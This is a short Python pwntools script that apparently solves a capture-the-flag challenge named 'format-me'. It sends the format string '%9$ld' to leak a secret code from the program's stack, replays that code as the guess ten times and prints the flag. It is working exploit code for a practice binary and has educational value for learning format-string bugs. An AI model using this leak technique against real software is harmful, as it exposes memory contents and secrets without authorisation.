#!/usr/bin/env python3
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
exe = ELF("./format-me")

r = process([exe.path])

try:
    for _ in range(10):
        # Wait for the "Recipient?" prompt
        r.recvuntil(b"Recipient? ")
        
        # Send the format string to leak `code`
        r.sendline(b"%9$ld")
        
        # Receive the line with the leaked `code`
        r.recvuntil(b"Sending to ")
        leak = r.recvline().strip()
        print(f"Leaked value: {leak}")
        
        # Convert leaked value to integer for the guess
        code = int(leak.decode())
        
        # Wait for the "Guess?" prompt
        r.recvuntil(b"Guess? ")
        
        # Send the leaked code as our guess
        r.sendline(str(code).encode())
        
        # Check if the guess was correct
        r.recvline()  # Read "Correct code! Package sent."
        print("Correct guess submitted.")

    # Receive and print the flag
    r.recvuntil(b"Here's your flag: ")
    flag = r.recvline()
    print(flag.decode())
    
except EOFError:
    print("Reached EOF unexpectedly.")